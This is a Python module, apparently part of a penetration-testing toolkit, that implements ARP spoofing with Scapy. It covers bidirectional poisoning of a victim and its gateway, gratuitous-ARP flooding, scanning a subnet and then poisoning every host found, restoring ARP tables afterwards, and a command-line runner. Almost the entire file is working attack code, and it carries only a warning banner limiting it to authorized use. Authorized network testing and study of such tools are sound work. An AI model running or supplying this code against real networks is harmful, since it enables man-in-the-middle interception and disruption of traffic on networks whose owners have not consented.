"""
ARP Spoofer - Controlled ARP Poisoning Attack Module

This module implements ARP spoofing/poisoning attacks for security testing.
Inspired by byt3bl33d3r/arpspoof (Python/Scapy) and alandau/arpspoof (Windows).

WARNING: This tool is for authorized security testing only.
Unauthorized use is illegal and unethical.

Author: Security Research Team
"""

import threading
import time
import sys
from typing import Optional, Tuple, List, Dict, Callable
from dataclasses import dataclass, field
from datetime import datetime
from collections import defaultdict

# Scapy imports
try:
    from scapy.all import (
        Ether, ARP, sendp, send, srp, conf,
        get_if_hwaddr, getmacbyip
    )
    SCAPY_AVAILABLE = True
except ImportError:
    SCAPY_AVAILABLE = False
    print("Warning: Scapy not available. ARP spoofing disabled.")

from core.network_utils import (
    get_mac_address, get_ip_address, get_gateway_info,
    get_arp_table, validate_interface
)
from core.arp_packet import ARPPacketBuilder
from config.settings import ARPConfig


@dataclass
class SpoofTarget:
    """Represents a target for ARP spoofing"""
    ip: str
    mac: str
    original_gateway_mac: Optional[str] = None
    packets_sent: int = 0
    last_poisoned: Optional[datetime] = None


@dataclass
class SpoofStatistics:
    """Statistics for ARP spoofing attack"""
    total_packets_sent: int = 0
    successful_poisons: int = 0
    failed_poisons: int = 0
    start_time: Optional[datetime] = None
    end_time: Optional[datetime] = None
    targets_poisoned: int = 0
    packets_per_target: Dict[str, int] = field(default_factory=dict)
    
    def to_dict(self) -> Dict:
        """Convert statistics to dictionary"""
        duration = 0
        if self.start_time and self.end_time:
            duration = (self.end_time - self.start_time).total_seconds()
        elif self.start_time:
            duration = (datetime.now() - self.start_time).total_seconds()
            
        return {
            'total_packets_sent': self.total_packets_sent,
            'successful_poisons': self.successful_poisons,
            'failed_poisons': self.failed_poisons,
            'targets_poisoned': self.targets_poisoned,
            'duration_seconds': duration,
            'packets_per_second': self.total_packets_sent / duration if duration > 0 else 0,
            'packets_per_target': dict(self.packets_per_target)
        }


class ARPSpoofer:
    """
    ARP Spoofing/Poisoning Attack Implementation
    
    This class implements controlled ARP poisoning attacks for security testing.
    It supports:
    - Bidirectional ARP poisoning (victim <-> gateway)
    - Gratuitous ARP flooding
    - Multiple target poisoning
    - Automatic restoration on cleanup
    
    Based on patterns from:
    - byt3bl33d3r/arpspoof: Python/Scapy implementation
    - alandau/arpspoof: Windows implementation patterns
    """
    
    def __init__(
        self,
        interface: str,
        target_ip: str,
        gateway_ip: Optional[str] = None,
        bidirectional: bool = True,
        interval: float = 1.0,
        verbose: bool = True
    ):
        """
        Initialize ARP Spoofer
        
        Args:
            interface: Network interface to use
            target_ip: Target victim IP address
            gateway_ip: Gateway IP (auto-detected if None)
            bidirectional: If True, poison both victim and gateway
            interval: Time between poison packets (seconds)
            verbose: Enable verbose output
        """
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for ARP spoofing")
            
        self.interface = interface
        self.target_ip = target_ip
        self.bidirectional = bidirectional
        self.interval = interval
        self.verbose = verbose
        
        # Validate interface
        if not validate_interface(interface):
            raise ValueError(f"Invalid interface: {interface}")
        
        # Get our own MAC address
        self.attacker_mac = get_mac_address(interface)
        self.attacker_ip = get_ip_address(interface)
        
        if not self.attacker_mac:
            raise RuntimeError(f"Could not get MAC address for {interface}")
            
        # Get gateway info
        if gateway_ip:
            self.gateway_ip = gateway_ip
        else:
            gw_info = get_gateway_info(interface)
            if gw_info:
                self.gateway_ip = gw_info['ip']
            else:
                raise RuntimeError("Could not detect gateway")
                
        # Resolve MAC addresses
        self.target_mac = self._resolve_mac(target_ip)
        self.gateway_mac = self._resolve_mac(self.gateway_ip)
        
        if not self.target_mac:
            raise RuntimeError(f"Could not resolve MAC for target: {target_ip}")
        if not self.gateway_mac:
            raise RuntimeError(f"Could not resolve MAC for gateway: {self.gateway_ip}")
            
        # Initialize state
        self._running = False
        self._poison_thread: Optional[threading.Thread] = None
        self._stop_event = threading.Event()
        self.statistics = SpoofStatistics()
        self.targets: Dict[str, SpoofTarget] = {}
        
        # Store original ARP entries for restoration
        self._original_arp_entries = self._snapshot_arp_table()
        
        # Packet builder
        self.packet_builder = ARPPacketBuilder(interface)
        
        # Callbacks for events
        self._callbacks: Dict[str, List[Callable]] = defaultdict(list)
        
        # Configure Scapy
        conf.verb = 0  # Disable Scapy verbose output
        conf.iface = interface
        
        self._log(f"ARP Spoofer initialized:")
        self._log(f"  Interface: {interface}")
        self._log(f"  Attacker: {self.attacker_ip} ({self.attacker_mac})")
        self._log(f"  Target: {target_ip} ({self.target_mac})")
        self._log(f"  Gateway: {self.gateway_ip} ({self.gateway_mac})")
        self._log(f"  Bidirectional: {bidirectional}")
        
    def _log(self, message: str):
        """Log message if verbose mode is enabled"""
        if self.verbose:
            timestamp = datetime.now().strftime("%H:%M:%S")
            print(f"[{timestamp}] [ARPSpoofer] {message}")
            
    def _resolve_mac(self, ip: str) -> Optional[str]:
        """Resolve IP address to MAC address using ARP"""
        try:
            # Try Scapy's getmacbyip first
            mac = getmacbyip(ip)
            if mac:
                return mac
                
            # Fall back to sending ARP request
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
            result = srp(arp_request, timeout=3, verbose=0, iface=self.interface)
            
            if result[0]:
                return result[0][0][1].hwsrc
                
            # Check local ARP table
            arp_table = get_arp_table()
            if ip in arp_table:
                return arp_table[ip]['mac']
                
        except Exception as e:
            self._log(f"Error resolving MAC for {ip}: {e}")
            
        return None
        
    def _snapshot_arp_table(self) -> Dict[str, str]:
        """Take a snapshot of current ARP table for restoration"""
        arp_table = get_arp_table()
        return {ip: info['mac'] for ip, info in arp_table.items()}
        
    def register_callback(self, event: str, callback: Callable):
        """Register a callback for events (poison_sent, restored, error)"""
        self._callbacks[event].append(callback)
        
    def _trigger_callback(self, event: str, *args, **kwargs):
        """Trigger registered callbacks for an event"""
        for callback in self._callbacks.get(event, []):
            try:
                callback(*args, **kwargs)
            except Exception as e:
                self._log(f"Callback error: {e}")
                
    def _build_poison_packet(
        self,
        target_ip: str,
        target_mac: str,
        spoof_ip: str
    ) -> Ether:
        """
        Build an ARP poison packet
        
        Args:
            target_ip: IP of the victim to poison
            target_mac: MAC of the victim
            spoof_ip: IP to impersonate
            
        Returns:
            Scapy Ether/ARP packet
        """
        # Create ARP reply claiming we are spoof_ip
        # op=2 is ARP reply
        packet = Ether(dst=target_mac, src=self.attacker_mac) / \
                 ARP(
                     op=2,  # is-at (reply)
                     hwsrc=self.attacker_mac,
                     psrc=spoof_ip,
                     hwdst=target_mac,
                     pdst=target_ip
                 )
        return packet
        
    def _build_gratuitous_arp(self, spoof_ip: str) -> Ether:
        """
        Build a gratuitous ARP packet
        
        Gratuitous ARPs are broadcast and claim ownership of an IP
        """
        packet = Ether(dst="ff:ff:ff:ff:ff:ff", src=self.attacker_mac) / \
                 ARP(
                     op=2,  # is-at (reply)
                     hwsrc=self.attacker_mac,
                     psrc=spoof_ip,
                     hwdst="ff:ff:ff:ff:ff:ff",
                     pdst=spoof_ip
                 )
        return packet
        
    def _poison_once(self) -> bool:
        """
        Send poison packets once to all targets
        
        Returns:
            True if successful
        """
        try:
            # Poison target: make them think we are the gateway
            poison_target = self._build_poison_packet(
                self.target_ip,
                self.target_mac,
                self.gateway_ip  # We claim to be the gateway
            )
            sendp(poison_target, iface=self.interface, verbose=0)
            self.statistics.total_packets_sent += 1
            self.statistics.packets_per_target[self.target_ip] = \
                self.statistics.packets_per_target.get(self.target_ip, 0) + 1
                
            if self.bidirectional:
                # Poison gateway: make them think we are the target
                poison_gateway = self._build_poison_packet(
                    self.gateway_ip,
                    self.gateway_mac,
                    self.target_ip  # We claim to be the target
                )
                sendp(poison_gateway, iface=self.interface, verbose=0)
                self.statistics.total_packets_sent += 1
                self.statistics.packets_per_target[self.gateway_ip] = \
                    self.statistics.packets_per_target.get(self.gateway_ip, 0) + 1
                    
            self.statistics.successful_poisons += 1
            self._trigger_callback('poison_sent', self.target_ip, self.gateway_ip)
            return True
            
        except Exception as e:
            self._log(f"Poison error: {e}")
            self.statistics.failed_poisons += 1
            self._trigger_callback('error', e)
            return False
            
    def _poison_loop(self):
        """Continuous poisoning loop running in a thread"""
        self._log("Starting poison loop...")
        
        while not self._stop_event.is_set():
            self._poison_once()
            self._stop_event.wait(self.interval)
            
        self._log("Poison loop stopped")
        
    def start(self):
        """Start the ARP poisoning attack"""
        if self._running:
            self._log("Already running")
            return
            
        self._log("Starting ARP poisoning attack...")
        self._running = True
        self._stop_event.clear()
        self.statistics.start_time = datetime.now()
        self.statistics.targets_poisoned = 1  # Primary target
        
        # Start poison thread
        self._poison_thread = threading.Thread(
            target=self._poison_loop,
            daemon=True,
            name="ARPPoisonThread"
        )
        self._poison_thread.start()
        
        self._log("Attack started. Press Ctrl+C to stop and restore ARP tables.")
        
    def stop(self, restore: bool = True):
        """
        Stop the ARP poisoning attack
        
        Args:
            restore: If True, restore original ARP entries
        """
        if not self._running:
            return
            
        self._log("Stopping ARP poisoning...")
        self._running = False
        self._stop_event.set()
        self.statistics.end_time = datetime.now()
        
        # Wait for thread to finish
        if self._poison_thread and self._poison_thread.is_alive():
            self._poison_thread.join(timeout=2)
            
        if restore:
            self.restore()
            
        self._log("Attack stopped")
        
    def restore(self, count: int = 5):
        """
        Restore original ARP entries to victim and gateway
        
        Args:
            count: Number of restoration packets to send
        """
        self._log("Restoring ARP tables...")
        
        for i in range(count):
            try:
                # Restore target's ARP: tell them the real gateway MAC
                restore_target = Ether(dst=self.target_mac, src=self.gateway_mac) / \
                                ARP(
                                    op=2,
                                    hwsrc=self.gateway_mac,
                                    psrc=self.gateway_ip,
                                    hwdst=self.target_mac,
                                    pdst=self.target_ip
                                )
                sendp(restore_target, iface=self.interface, verbose=0)
                
                if self.bidirectional:
                    # Restore gateway's ARP: tell them the real target MAC
                    restore_gateway = Ether(dst=self.gateway_mac, src=self.target_mac) / \
                                     ARP(
                                         op=2,
                                         hwsrc=self.target_mac,
                                         psrc=self.target_ip,
                                         hwdst=self.gateway_mac,
                                         pdst=self.gateway_ip
                                     )
                    sendp(restore_gateway, iface=self.interface, verbose=0)
                    
            except Exception as e:
                self._log(f"Restore error: {e}")
                
            time.sleep(0.5)
            
        self._log("ARP tables restored")
        self._trigger_callback('restored')
        
    def send_gratuitous_arp(self, ip: str, count: int = 1):
        """
        Send gratuitous ARP packets
        
        Args:
            ip: IP address to claim
            count: Number of packets to send
        """
        self._log(f"Sending {count} gratuitous ARP(s) for {ip}")
        
        for _ in range(count):
            packet = self._build_gratuitous_arp(ip)
            sendp(packet, iface=self.interface, verbose=0)
            self.statistics.total_packets_sent += 1
            time.sleep(0.1)
            
    def flood_gratuitous(self, ip: str, duration: float = 10.0, rate: int = 10):
        """
        Flood the network with gratuitous ARP packets
        
        Args:
            ip: IP address to claim
            duration: Duration of flood in seconds
            rate: Packets per second
        """
        self._log(f"Flooding gratuitous ARP for {ip} ({rate} pps for {duration}s)")
        
        interval = 1.0 / rate
        start = time.time()
        
        while time.time() - start < duration:
            self.send_gratuitous_arp(ip, 1)
            time.sleep(interval)
            
        self._log("Gratuitous ARP flood complete")
        
    def poison_targets(self, targets: List[str]):
        """
        Poison multiple targets
        
        Args:
            targets: List of IP addresses to poison
        """
        self._log(f"Poisoning {len(targets)} targets")
        
        for target_ip in targets:
            target_mac = self._resolve_mac(target_ip)
            if not target_mac:
                self._log(f"Could not resolve MAC for {target_ip}, skipping")
                continue
                
            self.targets[target_ip] = SpoofTarget(
                ip=target_ip,
                mac=target_mac,
                original_gateway_mac=self.gateway_mac
            )
            
            # Poison this target
            poison_packet = self._build_poison_packet(
                target_ip,
                target_mac,
                self.gateway_ip
            )
            sendp(poison_packet, iface=self.interface, verbose=0)
            self.targets[target_ip].packets_sent += 1
            self.targets[target_ip].last_poisoned = datetime.now()
            self.statistics.total_packets_sent += 1
            self.statistics.targets_poisoned += 1
            
        self._log(f"Poisoned {len(self.targets)} targets")
        
    def get_statistics(self) -> Dict:
        """Get attack statistics"""
        return self.statistics.to_dict()
        
    def is_running(self) -> bool:
        """Check if attack is running"""
        return self._running
        
    def __enter__(self):
        """Context manager entry"""
        self.start()
        return self
        
    def __exit__(self, exc_type, exc_val, exc_tb):
        """Context manager exit - always restore ARP tables"""
        self.stop(restore=True)
        return False


class ARPScanSpoofer(ARPSpoofer):
    """
    Extended ARP Spoofer with network scanning capabilities
    
    Scans the network for targets before poisoning
    """
    
    def __init__(
        self,
        interface: str,
        gateway_ip: Optional[str] = None,
        subnet: Optional[str] = None,
        **kwargs
    ):
        """
        Initialize scanner-spoofer
        
        Args:
            interface: Network interface
            gateway_ip: Gateway IP (auto-detected if None)
            subnet: Subnet to scan (e.g., "192.168.1.0/24")
            **kwargs: Additional arguments for ARPSpoofer
        """
        # First detect gateway if needed
        if not gateway_ip:
            gw_info = get_gateway_info(interface)
            if gw_info:
                gateway_ip = gw_info['ip']
            else:
                raise RuntimeError("Could not detect gateway")
                
        # Determine subnet if not provided
        if not subnet:
            ip = get_ip_address(interface)
            if ip:
                # Assume /24 network
                parts = ip.split('.')
                subnet = f"{parts[0]}.{parts[1]}.{parts[2]}.0/24"
                
        self.subnet = subnet
        self._discovered_hosts: List[Dict] = []
        
        # We'll set target_ip after scanning, use gateway as placeholder
        super().__init__(
            interface=interface,
            target_ip=gateway_ip,  # Placeholder, will be updated
            gateway_ip=gateway_ip,
            **kwargs
        )
        
    def scan_network(self, timeout: float = 3.0) -> List[Dict]:
        """
        Scan the network for live hosts
        
        Args:
            timeout: Scan timeout in seconds
            
        Returns:
            List of discovered hosts with IP and MAC
        """
        self._log(f"Scanning network: {self.subnet}")
        
        try:
            # ARP scan
            arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.subnet)
            result = srp(arp_request, timeout=timeout, verbose=0, iface=self.interface)
            
            self._discovered_hosts = []
            for sent, received in result[0]:
                if received.psrc != self.attacker_ip:  # Exclude ourselves
                    self._discovered_hosts.append({
                        'ip': received.psrc,
                        'mac': received.hwsrc
                    })
                    
            self._log(f"Discovered {len(self._discovered_hosts)} hosts")
            return self._discovered_hosts
            
        except Exception as e:
            self._log(f"Scan error: {e}")
            return []
            
    def get_discovered_hosts(self) -> List[Dict]:
        """Get list of discovered hosts"""
        return self._discovered_hosts
        
    def poison_all_hosts(self):
        """Poison all discovered hosts"""
        if not self._discovered_hosts:
            self.scan_network()
            
        ips = [h['ip'] for h in self._discovered_hosts 
               if h['ip'] != self.gateway_ip]
        self.poison_targets(ips)


def main():
    """Demo/test function for ARP Spoofer"""
    import argparse
    
    parser = argparse.ArgumentParser(description="ARP Spoofer")
    parser.add_argument("-i", "--interface", required=True, help="Network interface")
    parser.add_argument("-t", "--target", required=True, help="Target IP address")
    parser.add_argument("-g", "--gateway", help="Gateway IP (auto-detect if not provided)")
    parser.add_argument("-d", "--duration", type=float, default=30, help="Duration in seconds")
    parser.add_argument("--interval", type=float, default=1.0, help="Poison interval")
    parser.add_argument("--no-bidirectional", action="store_true", help="Disable bidirectional poisoning")
    
    args = parser.parse_args()
    
    print("[!] WARNING: ARP Spoofing is for authorized testing only!")
    print("[!] Make sure you have permission to test on this network.")
    
    try:
        spoofer = ARPSpoofer(
            interface=args.interface,
            target_ip=args.target,
            gateway_ip=args.gateway,
            bidirectional=not args.no_bidirectional,
            interval=args.interval
        )
        
        print(f"\n[*] Starting ARP poisoning for {args.duration} seconds...")
        spoofer.start()
        
        time.sleep(args.duration)
        
        spoofer.stop(restore=True)
        
        # Print statistics
        stats = spoofer.get_statistics()
        print(f"\n[*] Attack Statistics:")
        print(f"    Total packets sent: {stats['total_packets_sent']}")
        print(f"    Successful poisons: {stats['successful_poisons']}")
        print(f"    Duration: {stats['duration_seconds']:.2f} seconds")
        print(f"    Packets/second: {stats['packets_per_second']:.2f}")
        
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        spoofer.stop(restore=True)
    except Exception as e:
        print(f"[!] Error: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
